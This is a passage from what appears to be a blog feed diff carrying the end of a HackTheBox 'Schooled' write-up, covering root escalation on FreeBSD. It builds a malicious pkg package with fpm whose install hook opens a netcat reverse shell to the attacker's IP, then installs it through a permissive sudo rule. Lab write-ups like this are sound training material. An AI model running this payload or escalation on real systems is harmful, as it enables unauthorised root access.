+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo -l
+User jamie may run the following commands on Schooled:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
+</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
+<h4 id="installing-a-malicious-package">Installing a Malicious Package</h4>
+<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
+DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
+/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
+        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
+        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
+        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
+        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
+</span><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
+        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
+</span><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
+Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
+</code></pre></div><p>I will transfer the package to Schooled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
+</code></pre></div><blockquote>
+<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
+</blockquote>
+<p>On Schooled:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
+Connection from 10.10.14.49 <span class="m">60744</span> received!
+</code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
+Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
+The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:
+
+New packages to be INSTALLED:
+        x: 1.0
+
+Number of packages to be installed: <span class="m">1</span>
+<span class="o">[</span>1/1<span class="o">]</span> Installing x-1.0...
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p>And I&rsquo;m rooted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49»
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">23093</span>
+<span class="c1"># whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; cut -c-15 /root/root.txt</span>
+root
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span>,5<span class="o">(</span>operator<span class="o">)</span>
+Schooled
+2462d8e2125d2a0
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://github.com/HoangKien1020/CVE-2020-25627">https://github.com/HoangKien1020/CVE-2020-25627</a></li>
+<li><a href="https://github.com/HoangKien1020/CVE-2020-14321">https://github.com/HoangKien1020/CVE-2020-14321</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/pkg/">https://gtfobins.github.io/gtfobins/pkg/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Schooled</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-schooled/</link>
       <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
       
